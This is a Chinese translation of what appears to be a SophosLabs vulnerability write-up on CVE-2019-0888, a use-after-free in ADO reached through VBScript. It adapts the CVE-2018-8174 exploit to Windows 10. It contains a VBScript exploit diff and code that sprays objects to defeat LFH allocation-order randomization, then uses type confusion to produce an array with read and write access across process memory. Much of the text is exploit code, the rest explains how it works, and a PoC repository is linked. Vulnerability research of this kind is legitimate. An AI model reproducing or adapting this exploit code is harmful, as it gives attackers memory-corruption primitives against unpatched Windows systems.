    +
     Dim FreedObjectArray
     Dim UafArrayA(6),UafArrayB(6)
     Dim UafCounter
    @@ -101,7 +112,8 @@ Public Default Property Get Q
         Dim objectImitatingArray
         Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
         For idx=0 To 6
    -        UafArrayA(idx)=0
    +        On Error Resume Next
    +        Set m = RS(idx).NextRecordset(resueObjectA_arr)
         Next
         Set objectImitatingArray=New FakeReuseClass
         objectImitatingArray.mem = FakeArrayString
    @@ -116,7 +128,8 @@ Public Default Property Get P
         Dim objectImitatingInteger
         P=CDbl("636598737289582e-328") ' db 0, 0, 0, 0, 3, 0, 0, 0
         For idx=0 To 6
    -        UafArrayB(idx)=0
    +        On Error Resume Next
    +        Set m = RS(7+idx).NextRecordset(resueObjectB_int)
         Next
         Set objectImitatingInteger=New FakeReuseClass
         objectImitatingInteger.mem=Empty16BString
    @@ -136,19 +149,7 @@ Sub UafTrigger
         For idx=20 To 38
             Set objectArray(idx)=New ReuseClass
         Next
    -    UafCounter=0    
    -    For idx=0 To 6
    -        ReDim FreedObjectArray(1)
    -        Set FreedObjectArray(1)=New ClassTerminateA
    -        Erase FreedObjectArray
    -    Next
         Set resueObjectA_arr=New ReuseClass
    -    UafCounter=0
    -    For idx=0 To 6
    -        ReDim FreedObjectArray(1)
    -        Set FreedObjectArray(1)=New ClassTerminateB
    -        Erase FreedObjectArray
    -    Next
         Set resueObjectB_int=New ReuseClass
     End Sub
为ADO bug生成一个可用的漏洞。
事实证明，此漏洞利用适用于运行`Windows 7`的系统，但不适用于`Windows 8`或更高版本。 原始捕获的漏洞也是如此。
漏洞由于“低碎片堆（LFH）分配顺序随机化”而中断，这是`Windows 8`中引入的堆的安全方案，它打破了FAF后的开发方案。
### 绕过LFH分配顺序随机化
以下是Microsoft引入LFH分配顺序随机化后堆如何变化的一个示例：
引入分配顺序随机化改变了`malloc-> free-> malloc`执行的结果，从遵循LIFO（后进先出）逻辑到非确定性。
    Class ReplacingClass_Array
    Public Default Property Get Q
        ...
        For idx=0 To 6
            On Error Resume Next
            Set m = RS(idx).NextRecordset(reuseObjectA_arr)
        Next
        Set objectImitatingArray=New FakeReuseClass
        ...
在VBScript中，所有自定义类对象都由`VBScriptClass C++`类在内部表示。
VBScript在执行自定义类对象实例化语句时调用函数`VBScriptClass::Create`。它使用`0x44`字节大小的分配来保存`VBScriptClass`对象。
当控件到达第8行时，For循环刚刚完成销毁`reuseObjectA_arr`，这是自定义类`ReuseClass`的一个实例。这将导致调用`VBScriptClass`析构函数，释放先前分配的`0x44`字节。然后，第8行继续创建一个不同自定义类的新对象`objectImitatingArray：FakeReuseClass`。
成功运行类型混淆攻击的基础是假设`objectImitatingArray`将被分配与刚刚释放的`reuseObjectA_arr`具有相同的堆内存资源。但是如前所述，启用分配顺序随机化后，我们无法进行此假设。
由于类型混淆攻击，会发生内存损坏。发生损坏的堆分配不是`VBScriptClass`本身的顶级（0x44）分配，而是绑定到它的某个0x108字节大小的子分配，用于存储对象的方法和变量。负责此子分配的函数是`NameList::FCreateVval`，并在创建`VBScriptClass`后不久调用。
为了更具体地说明需要满足的条件，如果在销毁`reuseObjectA_arr`之后，新的`VBScript`对象接收到与之前保持的一个`reuseObjectA_arr`相同的0x108分配地址，则类型混淆将起作用。与两个对象相关联的其他分配不一定必须获得匹配的地址。
该技术的内存损坏部分的具体细节并不是很容易理解，建议阅读卡巴斯基背景文章以更好地理解它，但这是它的要点。
`ReuseClass`的方法`SetProp`具有以下语句：`mem = Value`。
Value是一个对象变量，因此必须在完成赋值之前调用其`Default Property Getter`。
VBScript引擎（vbscript.dll）调用内部函数AssignVar来执行此类赋值。这是一个简化的伪代码来解释它是如何工作的：
    AssignVar(VARIANT *destinationObject, char *destinationVariableName, VARIANT *source) {
      // here, destinationObject is a ReuseClass instance, destinationVariableName is "mem", source is 
      // get the address of object 's member variable with the name .
      VARIANT *destinationPointer = CScriptRuntime::GetVarAdr(destinationObject, destinationVariableName);
      // if the given source is an object, call the object's
      // default property getter to get the actual source value
      if (source->vt == VT_IDISPATCH) {
        VARIANT *sourceValue = VAR::InvokeByDispID(source);
      }
      // perform the assignment
      *destinationPointer = *sourceValue;
    }
函数VAR::InvokeByDispID调用源对象的默认属性getter，允许我们在AssignVar执行过程中运行任意VBScript代码。如果我们使用该空间来触发目标对象的内存中的销毁和替换，我们可以利用AssignVar继续执行到destinationPointer的赋值，而不会意识到它指向可能被篡改的内存。
写入的内存地址是`CScriptRuntime::GetVarAdr`返回的值，它是指向给定对象`0x108`分配内某处的指针。它在分配中的确切偏移取决于给定对象的类定义特别是其方法和字段的名称有多长。
`ReuseClass`和`FakeReuseClass`的定义以强制公共成员变量`mem`的不同偏移量的方式排列。这样做，我们强制最终赋值损坏对象的mem变量的头，以便将其转换为基类指针为`NULL`且长度为`0x7fffffff`的`Array`类型。
`CVE-2018-8174`的漏洞使用一次性方法来尝试解决类型混淆攻击，这意味着在销毁`reuseObjectA_arr`之后只创建了一个新对象。正如我们之前解释的那样，这只能在`Windows
8`之前的`Windows`系统上可靠地运行，因为`Windows 8`缺少`LFH`分配顺序随机化功能。
为了使这个漏洞利用在Windows
10系统上，我们可以实现一种强制方法来尝试类型混淆攻击。我们可以批量创建新对象，而不是创建单个新对象，以确保释放的0x108分配最终将被分配到其中一个。
以下是将代码转换为实现的直接方法：
    Set reuseObjectA_arr=New ReuseClass
    ...
    Class ReplacingClass_Array
    Public Default Property Get Q
        Dim objectImitatingArray
        Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
        For i=0 To 6
            DecrementRefcount(reuseObjectA_arr)
        Next
        For i=0 to UBound(UafArrayA)
            Set objectImitatingArray=New FakeReuseClass
            objectImitatingArray.mem = FakeArrayString
            For j=0 To 6
                Set UafArrayA(i,j)=objectImitatingArray
            Next
        Next
    End Property
    End Class
在用新的FakeReuseClass对象批量填充UafArrayA数组并完成mem =
Value赋值之后，我们可以迭代数组并找到其mem变量已成功损坏的对象变为数组：
    For i=0 To UBound(UafArrayA)
        Err.Clear
        a = UafArrayA(i,0).mem(Empty16BString_addr)
        If Err.Number = 0 Then
            Exit For
        End If
    Next
    If i > UBound(UafArrayA) Then
        MsgBox("Could not find an object corrupted by reuseObjectA_arr")
    Else
        MsgBox("Got UafArrayA_obj from UafArrayA(" & i & ")")
        Set UafArrayA_obj = UafArrayA(i,0)
    End If
损坏的对象将是唯一一个不会在第3行引发异常的对象。一旦找到它，就可以使用索引引用它，允许读取和写入进程内存空间中的所有地址。
通过对原始漏洞的修复，它现在也可以在Windows 10系统上运行。
### PoC
[SophosLabs GitHub repository](https://github.com/sophoslabs/CVE-2019-0888).
本文为翻译文章，翻译原文为：